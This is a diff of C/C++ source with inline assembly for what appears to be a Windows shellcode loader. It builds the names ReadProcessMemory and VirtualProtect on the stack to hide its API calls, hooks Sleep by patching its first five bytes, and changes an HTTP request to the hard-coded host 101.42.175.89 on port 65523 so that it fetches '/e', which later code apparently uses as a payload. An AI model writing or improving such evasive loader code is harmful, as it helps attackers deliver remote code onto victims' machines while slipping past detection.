@@ -266,7 +266,7 @@ DWORD _getFunction_ReadProcessMemory(DWORD getproaddress, DWORD kernel32) {
         push 0x00000079   //y
         push 0x726f6d65   //rome
         push 0x4d737365   //Msse
-        push 0x6f725244   //corP
+        push 0x636f7250   //corP
         push 0x64616552   //daeR
         push esp
         push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
@@ -335,7 +335,6 @@ DWORD _getFunction_VirtualProtect(DWORD getproaddress, DWORD kernel32) {
         mov eax, getproaddress
         push 0x00007463   //tc
         push 0x65746f72   //etor
-        push 0x73736563   //ssec
         push 0x506c6175   //Plau
         push 0x74726956   //triV
         push esp
@@ -553,6 +552,7 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
 void HookSleep() {
     SIZE_T bytesRead = 0;
     // 保留Hook的前5个字节，解绑后需还原
+    printf("%p\n", VirtualProtecta);
     (*ReadProcessMemorya)((*GetCurrentProcessa)(), hookaddress_sleep, sleepOriginalBytes, 5, &bytesRead);
     // 计算相对地址    
     //DWORD_PTR offsetAddress = (DWORD_PTR)HookedMessageBox - (DWORD_PTR)oldAddress - 5;
@@ -578,7 +578,7 @@ int main(int argc, CHAR* argv[]) {
     //HWND hwndDOS = GetForegroundWindow();
     //ShowWindow(hwndDOS, SW_HIDE);
     HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/gh");
+    std::string res = httpReq.HttpGet("/e");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
